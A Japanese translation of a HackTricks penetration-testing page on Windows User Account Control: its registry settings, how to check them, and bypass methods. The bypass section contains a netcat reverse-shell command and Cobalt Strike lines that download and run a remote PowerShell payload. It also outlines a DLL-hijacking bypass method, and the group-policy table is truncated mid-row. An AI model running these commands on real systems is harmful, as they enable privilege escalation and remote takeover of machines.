# UAC - ユーザーアカウント制御

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有する**には、[**hacktricks repo**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[ユーザーアカウント制御（UAC）](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)は、**昇格したアクティビティの承認プロンプト**を有効にする機能です。アプリケーションには異なる`integrity`レベルがあり、**高いレベル**のプログラムは**システムを危険にさらす可能性のあるタスクを実行**できます。UACが有効になっている場合、アプリケーションとタスクは常に、管理者がこれらのアプリケーション/タスクにシステムへの管理者レベルのアクセスを明示的に許可するまで、管理者以外のアカウントのセキュリティコンテキストで実行されます。これは、管理者が意図しない変更から保護する便利な機能ですが、セキュリティの境界とは見なされません。

整合性レベルについての詳細は、次のページを参照してください：

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

UACが設定されている場合、管理者ユーザーには2つのトークンが与えられます：通常のアクションを通常のレベルで実行するための標準ユーザーキーと、管理者特権を持つものとしてのトークンです。

この[ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)では、UACの動作、ユーザーエクスペリエンス、およびUACのアーキテクチャについて詳しく説明しています。管理者は、セキュリティポリシーを使用して、ローカルレベル（secpol.mscを使用）で組織固有のUACの動作を設定するか、Active Directoryドメイン環境でグループポリシーオブジェクト（GPO）を構成およびプッシュアウトすることができます。さまざまな設定については、[こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)で詳しく説明されています。UACに設定できる10のグループポリシー設定については、以下の表に詳細が記載されています：

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch
| [ユーザーアカウント制御：ユーザーごとの場所にファイルとレジストリの書き込みエラーを仮想化する](https://docs.microsoft.com/ja-jp/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations) | EnableVirtualization | 有効 |

### UACバイパスの理論

一部のプログラムは、ユーザーが管理者グループに所属している場合、**自動的に自動昇格**します。これらのバイナリには、_**マニフェスト**_内に_value_が_True_の_autoElevate_オプションがあります。また、バイナリは**Microsoftによって署名**されている必要もあります。

そのため、**UAC**（**中**の完全性レベルから**高**に昇格）を**バイパス**するため、一部の攻撃者はこの種のバイナリを使用して**任意のコードを実行**します。なぜなら、それは**高い完全性レベルのプロセス**から実行されるからです。

ツール_Sysinternals_の_sigcheck.exe_を使用してバイナリの_**マニフェスト**_を**確認**できます。また、_Process Explorer_または_Process Monitor_（Sysinternalsの）を使用して、プロセスの**完全性レベル**を**確認**できます。

### UACの確認

UACが有効かどうかを確認するには、以下を実行してください：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
もし **`1`** ならば、UACは **有効** です。もし **`0`** または **存在しない** 場合、UACは **無効** です。

次に、**どのレベル** が設定されているかを確認します：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* もし **`0`** なら、UACはプロンプトを表示しません（**無効**のようなものです）
* もし **`1`** なら、管理者はバイナリを高い権限で実行するためにユーザ名とパスワードを要求されます（セキュアデスクトップ上で）
* もし **`2`** なら（**常に通知**）、管理者が高い権限で何かを実行しようとすると、UACは常に確認を求めます（セキュアデスクトップ上で）
* もし **`3`** なら、`1` と同じですが、セキュアデスクトップ上では必要ありません
* もし **`4`** なら、`2` と同じですが、セキュアデスクトップ上では必要ありません
* もし **`5`**（**デフォルト**）なら、管理者に非Windowsバイナリを高い権限で実行するかどうか確認します

次に、**`LocalAccountTokenFilterPolicy`** の値を確認する必要があります\
もし値が **`0`** なら、**RID 500** ユーザー（**ビルトインの管理者**）のみがUACなしで**管理者タスクを実行**できます。もし値が `1` なら、**"Administrators"** グループ内のすべてのアカウントが実行できます。

そして、キー **`FilterAdministratorToken`** の値を確認します\
もし **`0`**（デフォルト）なら、**ビルトインの管理者アカウントは**リモート管理タスクを実行できます。もし **`1`** なら、ビルトインの管理者アカウントは**リモート管理タスクを実行できません**（ただし、`LocalAccountTokenFilterPolicy` が `1` に設定されている場合は除く）。

#### 要約

* `EnableLUA=0` または **存在しない** 場合、**誰にもUACはありません**
* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=1` の場合、誰にもUACはありません**
* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0` かつ `FilterAdministratorToken=0` の場合、RID 500（ビルトインの管理者）にはUACがありません**
* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0` かつ `FilterAdministratorToken=1` の場合、誰にもUACがあります**

これらの情報は、**metasploit** モジュール `post/windows/gather/win_privs` を使用して収集することができます。

また、ユーザーのグループを確認し、整合性レベルを取得することもできます。
```
net user %username%
whoami /groups | findstr Level
```
## UACバイパス

{% hint style="info" %}
被害者に対してグラフィカルなアクセス権がある場合、UACバイパスは簡単です。UACのプロンプトが表示されたら、「はい」をクリックするだけです。
{% endhint %}

UACバイパスは、次の状況で必要です：**UACが有効になっており、プロセスが中間完全性コンテキストで実行され、ユーザーが管理者グループに所属している**ことです。

重要なことは、**UACが最高セキュリティレベル（常に）に設定されている場合、他のレベル（デフォルト）に設定されている場合よりもUACバイパスがはるかに困難である**ということです。

### UACが無効化されている場合

UACが既に無効化されている場合（`ConsentPromptBehaviorAdmin`が**`0`**である場合）、次のような方法で**管理者特権（高い完全性レベル）で逆シェルを実行**することができます：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### トークン複製によるUACバイパス

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常に**基本的なUAC "バイパス"（完全なファイルシステムアクセス）

管理者グループに所属するユーザーを持つシェルがある場合、SMB（ファイルシステム）を介してC$共有を**マウント**することができます。新しいディスクにローカルにマウントされ、ファイルシステム内のすべてに**アクセスできます**（管理者のホームフォルダーも含まれます）。

{% hint style="warning" %}
**このトリックはもう機能しないようです**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UACバイパスのコバルトストライクによる攻撃

UACのセキュリティレベルが最大に設定されていない場合にのみ、コバルトストライクのテクニックが機能します。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire**と**Metasploit**には、**UAC**を**バイパス**するためのいくつかのモジュールもあります。

### KRBUACBypass

ドキュメントとツールは[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)にあります。

### UACバイパスの脆弱性

[**UACME**](https://github.com/hfiref0x/UACME)は、いくつかのUACバイパスの脆弱性のコンパイルです。UACMEをビジュアルスタジオまたはmsbuildを使用してコンパイルする必要があります。コンパイルにより、いくつかの実行可能ファイル（例：`Source\Akagi\outout\x64\Debug\Akagi.exe`）が作成されますが、**どれが必要かを知る必要があります。**\
何らかのプログラムがユーザーに何かが起こっていることを警告することがあるため、**注意が必要**です。

UACMEには、各テクニックが動作を開始したビルドバージョンがあります。自分のバージョンに影響を与えるテクニックを検索できます。
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
また、[この](https://en.wikipedia.org/wiki/Windows\_10\_version\_history)ページを使用すると、ビルドバージョンからWindowsリリース`1607`を取得できます。

#### さらなるUACバイパス

ここで使用されるすべてのUACバイパス技術は、被害者との完全な対話型シェルが必要です（一般的なnc.exeシェルでは十分ではありません）。

**meterpreter**セッションを使用することができます。**セッション**値が**1**に等しい**プロセス**に移行します。

![](<../../.gitbook/assets/image (96).png>)

（_explorer.exe_が動作するはずです）

### GUIを使用したUACバイパス

**GUIにアクセスできる場合、UACプロンプトを受け入れるだけでバイパスすることができます**。そのため、GUIにアクセスできればUACをバイパスすることができます。

さらに、（おそらくRDP経由で）他の誰かが使用していたGUIセッションにアクセスできる場合、[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)のような**管理者として実行されるツール**がいくつか実行されている可能性があります。これにより、UACによる再度のプロンプトなしに、例えば**cmdを管理者として直接実行**することができます。これはより**ステルス**です。

### 騒々しいブルートフォースUACバイパス

騒々しくなることを気にしない場合、常に[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)のようなものを実行して、ユーザーが許可するまで権限の昇格を要求することができます。

### 独自のバイパス - 基本的なUACバイパスの方法論

**UACME**を見ると、**ほとんどのUACバイパスがDllハイジャックの脆弱性を悪用**していることに気付くでしょう（主に悪意のあるdllを_C:\Windows\System32_に書き込むこと）。[Dllハイジャックの脆弱性を見つける方法については、こちらを読んでください](../windows-local-privilege-escalation/dll-hijacking.md)。

1. **自動昇格**するバイナリを見つけます（実行されると高い完全性レベルで実行されることを確認します）。
2. procmonを使用して、**DLLハイジャック**の脆弱性に対して**NAME NOT FOUND**イベントを見つけます。
3. おそらく、書き込み権限がない**保護されたパス**（C:\Windows\System32など）にDLLを**書き込む**必要があるでしょう。これを回避するには、次の方法を使用できます。
1. **wusa.exe**：Windows 7、8、および8.1。保護されたパス内にCABファイルの内容を抽出することができます（このツールは高い完全性レベルから実行されるため）。
2. **IFileOperation**：Windows 10。
4. バイナリを保護されたパスにDLLをコピーし、脆弱性のある自動昇格バイナリを実行するためのスクリプトを準備します。

### 別のUACバイパス技術

**自動昇格バイナリ**が**レジストリ**から**実行される**バイナリまたは**コマンド**の**名前/パス**を**読み取ろうとする**かどうかを監視する方法です（これは、バイナリがこの情報を**HKCU**内で検索する場合に特に興味深いです）。

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**することができます。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
